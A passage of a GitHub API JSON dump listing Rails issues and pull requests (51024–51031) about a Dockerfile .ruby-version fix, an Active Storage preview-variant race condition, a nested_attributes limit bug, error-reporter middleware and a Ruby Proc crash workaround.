        "created_at": "2024-02-09T18:33:18Z",
        "updated_at": "2024-02-09T18:39:43Z",
        "closed_at": "2024-02-09T18:39:43Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51031",
            "html_url": "https://github.com/rails/rails/pull/51031",
            "diff_url": "https://github.com/rails/rails/pull/51031.diff",
            "patch_url": "https://github.com/rails/rails/pull/51031.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because the default Dockerfile will fail to build when it attempts to bundle gems, when there is no `.ruby-version` file for it to refer to if developers have updated the Gemfile ruby reference in a certain (but valid) way.Bundler [2.4.19](https://github.com/rubygems/rubygems/blob/master/bundler/CHANGELOG.md#2419-august-17-2023) [introduced](https://github.com/rubygems/rubygems/pull/6876) the ability to read in the version of Ruby from the `.ruby-version` file.\r\n\r\n`ruby file: '.ruby-version'`\r\n\r\nRails doesn't currently use this pattern, setting the Ruby version in both the `.ruby-version` file and the `Gemfile`.\r\n\r\nHowever, some developers _will_ update the Gemfile to use the new `file:` syntax, as it is a perfectly valid way of referencing the ruby version. \r\n### Detail\r\n\r\nThis Pull Request changes the generated Dockerfile so that it copies over the `.ruby-version` file at the same time as the `Gemfile` and `Gemfile.lock` so bundler has everything it needs to bundle regardless of which method developers have chosen to specify the Ruby version in the Gemfile.\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51031/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51031/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51030",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51030/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51030/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51030/events",
        "html_url": "https://github.com/rails/rails/pull/51030",
        "id": 2127640411,
        "node_id": "PR_kwDNIULOZoIeqA",
        "number": 51030,
        "title": "Fixes race condition for multiple preprocessed video variants",
        "user": {
            "login": "searls",
            "id": 79303,
            "node_id": "MDQ6VXNlcjc5MzAz",
            "avatar_url": "https://avatars.githubusercontent.com/u/79303?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/searls",
            "html_url": "https://github.com/searls",
            "followers_url": "https://api.github.com/users/searls/followers",
            "following_url": "https://api.github.com/users/searls/following{/other_user}",
            "gists_url": "https://api.github.com/users/searls/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/searls/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/searls/subscriptions",
            "organizations_url": "https://api.github.com/users/searls/orgs",
            "repos_url": "https://api.github.com/users/searls/repos",
            "events_url": "https://api.github.com/users/searls/events{/privacy}",
            "received_events_url": "https://api.github.com/users/searls/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-09T18:17:16Z",
        "updated_at": "2024-02-17T03:12:37Z",
        "closed_at": "2024-02-09T23:15:54Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51030",
            "html_url": "https://github.com/rails/rails/pull/51030",
            "diff_url": "https://github.com/rails/rails/pull/51030.diff",
            "patch_url": "https://github.com/rails/rails/pull/51030.patch",
            "merged_at": "2024-02-09T23:15:54Z"
        },
        "body": "(This PR supersedes #50928, which I'll close)\r\n\r\nThis fixes race condition in Active Storage when multiple preprocessed variants are defined for a `Previewable` file is attached.\r\n\r\n## Background\r\n\r\nWhen a variant is specified for a \"previewable\" file type (e.g. video  or PDF) attachment, a `preview_image` attachment is first created and attached on the original blob and then any user-specified variants are derived from _that_ preview image. When those variants are named and have `preprocessed: true`, the jobs to create those variants are queued simultaneously.\r\n\r\nExample from my case:\r\n\r\n```ruby\r\n  has_one_attached :file, dependent: :purge_later do |attachable|\r\n    attachable.variant :preview, resize_to_fill: [400, 400], preprocessed: true\r\n    attachable.variant :still, format: \"jpg\", saver: {quality: 85}, preprocessed: true\r\n  end\r\n```\r\n\r\n## The issue\r\n\r\nWhen a `Previewable` attachment is created (a video, in my case), `TransformJob.perform_later` is called for each named variant with `preprocessed: true`. Unless your queue adapter is synchronous (e.g. :inline or :test), this results in a race condition in which every such variant's worker will check `processed?`, see that no `preview_image` attachment exists yet on the `ActiveStorage::Blob`, and:\r\n\r\n1. Redundantly download the file from storage\r\n2. Create duplicative ActiveStorage::Attachment and `ActiveStorage::Blob` records for the `preview_image` attachment (all but one of which will be orphaned from the original blob's `has_one_attached :preview_image`)\r\n3. Create variant blobs (and associated `ActiveStorage::VariantRecord`) that are similarly orphaned (by virtue of being a variant of an orphaned `preview_image` blob)\r\n\r\nAs a result, if the video is ever purged, `PurgeJob` will only find the current `has_one_attached :preview_image` and whatever variant demanded it into existence, then leave the rest as orphaned records in the database and in storage.\r\n\r\n## The fix\r\n\r\nQueue a `PreviewImageJob` instead of N `TransformJob` jobs and have it, only after `preview_image` is attached, enqueue any subsequent `TransformJob` jobs\r\n\r\n## Testing caveat \r\n\r\nWriting a reproduction test case for this inside Rails would be difficult because it would require running the resulting TransformJob jobs concurrently. I [started a test](https://github.com/searls/rails/blob/fix-video-duplicate-preview-variants/activestorage/test/models/variant_with_record_test.rb#L348-L367) but failed to reproduce, in part because the test queue adapter will perform enqueued jobs inline instead of concurrently. In order to write a test that replicated the issue appropriately, we might first need a new option for `perform_enqueued_jobs(async: true) { }`\r\n\r\nIf you're interested, [this gist](https://gist.github.com/searls/5b8298abe88b3206f670ea3c6d574aab) includes a driver script and output before and after the patch showing it working.\r\n\r\n## Evaluating impact on existing Active Storage users\r\n\r\nI only found this because I'm a total cheapskate and was literally counting records in my S3 bucket to ensure `PurgeJob` worked. Then I wasted the next two days trying to figure out why before landing on this. I strongly suspect that ActiveStorage users who host video and take advantage of `preprocessed: true` named variants will have a lot of orphaned stuff floating around their buckets.\r\n\r\nTo see if you have any such \"zombie\" preview_images (and presumably, associated variants) floating around your application that would survive calls to `purge` on the owning attachment, you could write a query like this:\r\n\r\n```\r\nActiveStorage::Attachment\r\n  .joins(\"INNER JOIN active_storage_attachments as other_attachments ON\r\n          active_storage_attachments.record_id = other_attachments.record_id AND\r\n          active_storage_attachments.id != other_attachments.id\")\r\n  .where(\r\n    :name => \"preview_image\",\r\n    :record_type => \"ActiveStorage::Blob\",\r\n    \"other_attachments.name\" => \"preview_image\",\r\n    \"other_attachments.record_type\" => \"ActiveStorage::Blob\"\r\n  )\r\n  .distinct\r\n```\r\n\r\nClearing out one's production database and backend storage to get this all right-sized should be a fun exercise for the reader.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51030/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51030/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51029",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51029/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51029/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51029/events",
        "html_url": "https://github.com/rails/rails/issues/51029",
        "id": 2127545514,
        "node_id": "I_kwDNIULOfs_Eqg",
        "number": 51029,
        "title": "nested_attributes_for :limit does not account for records marked for deletion",
        "user": {
            "login": "searls",
            "id": 79303,
            "node_id": "MDQ6VXNlcjc5MzAz",
            "avatar_url": "https://avatars.githubusercontent.com/u/79303?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/searls",
            "html_url": "https://github.com/searls",
            "followers_url": "https://api.github.com/users/searls/followers",
            "following_url": "https://api.github.com/users/searls/following{/other_user}",
            "gists_url": "https://api.github.com/users/searls/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/searls/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/searls/subscriptions",
            "organizations_url": "https://api.github.com/users/searls/orgs",
            "repos_url": "https://api.github.com/users/searls/repos",
            "events_url": "https://api.github.com/users/searls/events{/privacy}",
            "received_events_url": "https://api.github.com/users/searls/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-09T17:13:42Z",
        "updated_at": "2024-02-12T13:48:50Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "Noticed that when an update to a model that accepts nested attributes with a `:limit` specified that any batch update of nested records will count any records marked for deletion along with any new ones, which raises.\r\n\r\nWorkaround for now is to remove `limit` on the `nested_attributes_for` call and write a custom validation:\r\n\r\n```ruby\r\nclass Post < ApplicationRecord\r\n  has_many :comments, dependent: :destroy\r\n  accepts_nested_attributes_for :comments, allow_destroy: true\r\n\r\n  validate :validate_comments_count\r\n\r\n  private\r\n\r\n  def validate_comments_count\r\n    count = comments.count { |c| !c.marked_for_destruction? }\r\n\r\n    if count > 10\r\n      errors.add(:base, \"A post can have at most 10 comments\")\r\n    end\r\n  end\r\nend\r\n\r\n```\r\n\r\n### Steps to reproduce\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :posts, force: true do |t|\r\n  end\r\n\r\n  create_table :comments, force: true do |t|\r\n    t.integer :post_id\r\n  end\r\nend\r\n\r\nclass Post < ActiveRecord::Base\r\n  has_many :comments\r\n\r\n  accepts_nested_attributes_for :comments, allow_destroy: true, limit: 2\r\nend\r\n\r\nclass Comment < ActiveRecord::Base\r\n  belongs_to :post\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_nested_attributes_limit\r\n    post = Post.create!(comments_attributes: [{}, {}])\r\n    first_comment, second_comment = post.comments\r\n\r\n    post.update!(comments_attributes: [\r\n      first_comment.attributes,\r\n      second_comment.attributes.merge(\"_destroy\" => 1),\r\n      {}\r\n    ])\r\n  end\r\nend\r\n\r\n```\r\n\r\n### Expected behavior\r\n\r\nThe `limit` validation should reject any associated records `marked_for_deletion?`\r\n\r\n### Actual behavior\r\n\r\nIt instead counts all associated records.\r\n\r\n### System configuration\r\n**Rails version**:  7.1.3\r\n\r\n**Ruby version**: ruby 3.3.0 (2023-12-25 revision 5124f9ac75) [arm64-darwin23]\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51029/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51029/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51028",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51028/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51028/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51028/events",
        "html_url": "https://github.com/rails/rails/pull/51028",
        "id": 2127467477,
        "node_id": "PR_kwDNIULOZn_CYQ",
        "number": 51028,
        "title": "Add new middleware to ensure errors are always reported to the AS error reporter",
        "user": {
            "login": "npezza93",
            "id": 5059927,
            "node_id": "MDQ6VXNlcjUwNTk5Mjc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5059927?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/npezza93",
            "html_url": "https://github.com/npezza93",
            "followers_url": "https://api.github.com/users/npezza93/followers",
            "following_url": "https://api.github.com/users/npezza93/following{/other_user}",
            "gists_url": "https://api.github.com/users/npezza93/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/npezza93/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/npezza93/subscriptions",
            "organizations_url": "https://api.github.com/users/npezza93/orgs",
            "repos_url": "https://api.github.com/users/npezza93/repos",
            "events_url": "https://api.github.com/users/npezza93/events{/privacy}",
            "received_events_url": "https://api.github.com/users/npezza93/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-09T16:24:32Z",
        "updated_at": "2024-02-09T16:25:13Z",
        "closed_at": "2024-02-09T16:25:12Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51028",
            "html_url": "https://github.com/rails/rails/pull/51028",
            "diff_url": "https://github.com/rails/rails/pull/51028.diff",
            "patch_url": "https://github.com/rails/rails/pull/51028.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because it was reported in https://github.com/rails/rails/issues/51002#issuecomment-1936054456 that the Rails error reporter is not reporting errors in production.\r\n\r\nFixes #51002\r\n### Detail\r\n\r\nThis moves the reporting to inside a new middleware, ReportErrors, which is always hit in prod and development and removes the reporting from the Executor middleware. Moving it here ensures errors are always reported regardless of the environment. \r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51028/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51028/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51027",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51027/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51027/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51027/events",
        "html_url": "https://github.com/rails/rails/pull/51027",
        "id": 2127464082,
        "node_id": "PR_kwDNIULOZn-2bQ",
        "number": 51027,
        "title": "Fix NoMethodErrors in Active Record after backport [7-1-stable]",
        "user": {
            "login": "skipkayhil",
            "id": 6014046,
            "node_id": "MDQ6VXNlcjYwMTQwNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6014046?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/skipkayhil",
            "html_url": "https://github.com/skipkayhil",
            "followers_url": "https://api.github.com/users/skipkayhil/followers",
            "following_url": "https://api.github.com/users/skipkayhil/following{/other_user}",
            "gists_url": "https://api.github.com/users/skipkayhil/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/skipkayhil/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/skipkayhil/subscriptions",
            "organizations_url": "https://api.github.com/users/skipkayhil/orgs",
            "repos_url": "https://api.github.com/users/skipkayhil/repos",
            "events_url": "https://api.github.com/users/skipkayhil/events{/privacy}",
            "received_events_url": "https://api.github.com/users/skipkayhil/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-09T16:22:19Z",
        "updated_at": "2024-02-09T17:11:17Z",
        "closed_at": "2024-02-09T17:11:16Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51027",
            "html_url": "https://github.com/rails/rails/pull/51027",
            "diff_url": "https://github.com/rails/rails/pull/51027.diff",
            "patch_url": "https://github.com/rails/rails/pull/51027.patch",
            "merged_at": "2024-02-09T17:11:16Z"
        },
        "body": "Ref #51012\r\n\r\nconnected? only exists on main, but was included in a [backport][1]\r\n\r\n[1]: https://github.com/rails/rails/commit/eb760da85898017a1ea300a8f08c32d0412879d3\r\n\r\ncc @byroot ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51027/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51027/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51026",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51026/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51026/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51026/events",
        "html_url": "https://github.com/rails/rails/pull/51026",
        "id": 2127373710,
        "node_id": "PR_kwDNIULOZn52yg",
        "number": 51026,
        "title": "Move where errors are reported to ensure they are reported in production",
        "user": {
            "login": "npezza93",
            "id": 5059927,
            "node_id": "MDQ6VXNlcjUwNTk5Mjc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5059927?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/npezza93",
            "html_url": "https://github.com/npezza93",
            "followers_url": "https://api.github.com/users/npezza93/followers",
            "following_url": "https://api.github.com/users/npezza93/following{/other_user}",
            "gists_url": "https://api.github.com/users/npezza93/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/npezza93/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/npezza93/subscriptions",
            "organizations_url": "https://api.github.com/users/npezza93/orgs",
            "repos_url": "https://api.github.com/users/npezza93/repos",
            "events_url": "https://api.github.com/users/npezza93/events{/privacy}",
            "received_events_url": "https://api.github.com/users/npezza93/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-09T15:32:40Z",
        "updated_at": "2024-02-09T15:36:58Z",
        "closed_at": "2024-02-09T15:36:58Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51026",
            "html_url": "https://github.com/rails/rails/pull/51026",
            "diff_url": "https://github.com/rails/rails/pull/51026.diff",
            "patch_url": "https://github.com/rails/rails/pull/51026.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nAs reported in https://github.com/rails/rails/issues/51002#issuecomment-1936054456 the Rails error reporter is not reporting errors in production. \r\n\r\nFixes #51002\r\n\r\n### Detail\r\n\r\nThis moves the reporting to inside the DebugExceptions middleware which is always hit in prod and development and removes the reporting from the Executor middleware. Moving it here also ensures they are reported in development. Initially i had wanted it in ShowExceptions but in development DebugExceptions swallows it first. \r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51026/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51026/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51025",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51025/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51025/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51025/events",
        "html_url": "https://github.com/rails/rails/pull/51025",
        "id": 2127371074,
        "node_id": "PR_kwDNIULOZn5tUQ",
        "number": 51025,
        "title": "Workaround a Ruby bug that can cause a VM crash",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-09T15:31:19Z",
        "updated_at": "2024-02-09T15:50:50Z",
        "closed_at": "2024-02-09T15:46:54Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51025",
            "html_url": "https://github.com/rails/rails/pull/51025",
            "diff_url": "https://github.com/rails/rails/pull/51025.diff",
            "patch_url": "https://github.com/rails/rails/pull/51025.patch",
            "merged_at": "2024-02-09T15:46:54Z"
        },
        "body": "See: https://bugs.ruby-lang.org/issues/20250\r\n\r\nThe bug exist all the way since Ruby 2.7, if you `clone` a `Proc` object on which you already accessed `object_id`, when its clone is GCed Ruby will crash.\r\n\r\nBy accessing the clone's `object_id` right away, we prevent the crash.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51025/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 1,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51025/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51024",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51024/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51024/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51024/events",
        "html_url": "https://github.com/rails/rails/pull/51024",
        "id": 2127355300,
        "node_id": "PR_kwDNIULOZn40vg",
        "number": 51024,
        "title": "Ensure errors are reported, even when rendered and not raised",
        "user": {
            "login": "fractaledmind",
            "id": 5077225,
            "node_id": "MDQ6VXNlcjUwNzcyMjU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5077225?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fractaledmind",
            "html_url": "https://github.com/fractaledmind",
            "followers_url": "https://api.github.com/users/fractaledmind/followers",
            "following_url": "https://api.github.com/users/fractaledmind/following{/other_user}",
            "gists_url": "https://api.github.com/users/fractaledmind/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fractaledmind/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fractaledmind/subscriptions",
            "organizations_url": "https://api.github.com/users/fractaledmind/orgs",
            "repos_url": "https://api.github.com/users/fractaledmind/repos",
            "events_url": "https://api.github.com/users/fractaledmind/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fractaledmind/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-09T15:23:45Z",
        "updated_at": "2024-02-09T17:36:54Z",
        "closed_at": "2024-02-09T17:04:16Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51024",
            "html_url": "https://github.com/rails/rails/pull/51024",
            "diff_url": "https://github.com/rails/rails/pull/51024.diff",
            "patch_url": "https://github.com/rails/rails/pull/51024.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nResolves #51002\r\n\r\n### Detail\r\n\r\nThis Pull Request ensures that errors are reported, even when rendered and not raised\r\n\r\n### Additional information\r\n\r\nI am not sure how to test this...\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51024/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51024/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51023",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51023/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51023/comments",
